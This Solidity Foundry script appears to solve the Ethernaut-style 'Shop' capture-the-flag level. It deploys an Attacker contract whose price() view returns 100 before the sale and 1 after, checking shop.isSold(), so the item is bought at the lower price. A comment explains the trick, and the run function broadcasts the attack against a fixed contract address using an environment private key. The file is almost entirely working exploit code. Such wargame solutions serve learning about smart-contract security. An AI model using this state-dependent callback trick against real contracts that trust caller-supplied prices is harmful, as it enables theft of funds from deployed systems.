// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";

contract Attacker {
    
    Shop shop;
    constructor(address _address) {
        shop = Shop(_address);
    }

    function shopNow() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }

}

contract ShopScript is Script {

    Shop private shop = Shop(0x727a087fEc48C4189618D54Ff0f96125e88cF1C1);
    /**
     * Solution: 
     * Buyer(msg.sender) - we can deploy malicious contract and execute the transaction on behalf of it.
     * price() - since it's view we can't change the state. 
     * By default bool is false, which means !isSold at the very beginning is true.
     * This means that when we enter price() in the contract the first time should be 100, and the second time
     * should be 1. For that reason we can use shop.isSold().
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(address(shop));
        attacker.shopNow();
        
        vm.stopBroadcast();
    }
}
